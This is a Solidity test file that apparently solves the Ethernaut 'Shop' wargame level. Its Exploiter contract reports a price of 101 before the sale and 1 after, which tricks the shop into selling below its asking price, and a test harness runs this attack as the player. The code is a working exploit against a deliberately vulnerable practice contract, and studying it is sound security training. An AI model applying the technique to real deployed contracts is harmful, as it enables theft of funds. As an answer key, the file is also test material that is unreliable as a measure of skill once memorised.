// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Shop.sol";
import "src/levels/ShopFactory.sol";

contract Exploiter {
    Shop shop;

    constructor(Shop shopAddress) public {
        shop = Shop(shopAddress);
    }

    function price() external view returns (uint256) {
        return shop.isSold() ? 1 : 101;
    }

    function buyFromShop() public {
        shop.buy();
    }
}


contract TestShop is BaseTest {
    Shop private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ShopFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Shop(levelAddress);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */
        vm.startPrank(player);

        Exploiter buyer = new Exploiter(level);

        buyer.buyFromShop();

        vm.stopPrank();
    }
}
